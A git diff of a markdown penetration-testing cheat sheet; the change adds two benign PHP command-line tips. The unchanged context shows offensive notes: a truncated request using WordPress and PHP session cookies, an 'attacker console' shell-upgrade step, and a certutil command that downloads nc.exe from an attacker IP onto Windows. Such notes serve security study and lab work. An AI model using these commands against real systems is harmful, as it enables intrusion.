@@ -99,6 +99,10 @@ test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j
 > 1. **In Attacker console**
 > 1. stty size (to find ROWS and COLUMNS value)
 
+#### Playing with PHP
+> 1. To execute a PHP script file, in command line simply type -> php <file name.php>
+> 1. to start a php based webserver, simply type -> php -S localhost:8000
+  
 #### Windws Tricks
 ##### Download a file in Windows via certutil
 > 1. certutil -urlcache -split -f http://192.168.10.100/nc.exe nc.exe
